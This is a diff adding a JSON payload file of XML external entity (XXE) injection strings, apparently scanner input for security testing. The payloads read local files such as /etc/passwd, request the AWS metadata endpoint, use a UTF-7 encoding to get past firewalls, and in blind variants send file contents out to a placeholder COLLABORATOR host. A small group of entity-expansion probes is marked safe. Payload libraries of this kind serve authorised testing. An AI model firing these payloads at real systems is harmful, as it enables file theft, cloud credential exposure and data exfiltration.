@@ -1,0 +1,42 @@
+{
+  "category": "xml_injection",
+  "contexts": {
+    "xxe_basic": {
+      "description": "Basic XXE payloads for in-band entity expansion and local file read",
+      "payloads": [
+        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><root>&xxe;</root>", "description": "Classic XXE local file read — hostname", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>", "description": "XXE file read — passwd (non-destructive read)", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&xxe;</root>", "description": "XXE SSRF to AWS metadata endpoint", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/hostname\">]><root>&xxe;</root>", "description": "XXE with PHP filter base64 encoding", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/hostname\"><!ENTITY display \"%xxe;\">]><root>&display;</root>", "description": "XXE with parameter entity indirection", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-7\"?>+ADw-!DOCTYPE foo +AFs-+ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/hostname+ACI-+AD4-+AF0-+AD4-+ADw-root+AD4-+ACY-xxe+ADsAPA-/root+AD4-", "description": "UTF-7 encoded XXE for encoding filter bypass", "waf_bypass": true},
+        {"payload": "<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><foo>&xxe;</foo>", "description": "XXE with ELEMENT declaration", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"jar:file:///etc/hostname!/\">]><root>&xxe;</root>", "description": "XXE via jar: protocol (Java environments)", "waf_bypass": false}
+      ]
+    },
+    "xxe_blind": {
+      "description": "Blind XXE payloads using OOB exfiltration via Collaborator callbacks",
+      "payloads": [
+        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://COLLABORATOR\">]><root>&xxe;</root>", "description": "Blind XXE OOB detection via Collaborator HTTP", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % ext SYSTEM \"http://COLLABORATOR/xxe.dtd\">%ext;]><root>test</root>", "description": "Blind XXE with external DTD hosted on Collaborator", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"https://COLLABORATOR\">]><root>&xxe;</root>", "description": "Blind XXE OOB via HTTPS Collaborator", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo SYSTEM \"http://COLLABORATOR/xxe.dtd\"><root>test</root>", "description": "External DTD reference to Collaborator", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://COLLABORATOR\">%xxe;]><root>x</root>", "description": "Parameter entity OOB to Collaborator", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"dns://COLLABORATOR\">]><root>&xxe;</root>", "description": "Blind XXE DNS OOB via Collaborator", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % a SYSTEM \"file:///etc/hostname\"><!ENTITY % b \"<!ENTITY exfil SYSTEM 'http://COLLABORATOR/?d=%a;'>\">%b;]><root>&exfil;</root>", "description": "Blind XXE with file content exfil via Collaborator query string", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % ext SYSTEM \"http://COLLABORATOR/xxe.dtd\">%ext;%exfil;]><root>test</root>", "description": "Blind XXE chained DTD with exfil entity", "waf_bypass": false}
+      ]
+    },
+    "entity_expansion": {
+      "description": "XML entity expansion detection probes (safe — small payloads that detect whether expansion is allowed)",
+      "payloads": [
+        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY a \"1234567890\">]><root>&a;&a;&a;&a;&a;</root>", "description": "Small entity expansion probe — 5x10 chars", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY a \"AAAAAAAAAA\"><!ENTITY b \"&a;&a;&a;&a;&a;\">]><root>&b;</root>", "description": "Two-level nested expansion probe — 50 chars", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY a \"x\"><!ENTITY b \"&a;&a;\"><!ENTITY c \"&b;&b;\"><!ENTITY d \"&c;&c;\">]><root>&d;</root>", "description": "Four-level nested expansion probe — 16 chars (safe exponential detection)", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe \"expansion-detected\">]><root>&xxe;</root>", "description": "Basic internal entity expansion detection", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % a \"test\"><!ENTITY b \"%a;\">]><root>&b;</root>", "description": "Parameter entity in internal subset detection", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" standalone=\"no\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///dev/null\">]><root>&xxe;</root>", "description": "Entity expansion with standalone=no and /dev/null (safe read)", "waf_bypass": false}
+      ]
+    }
+  }
+}
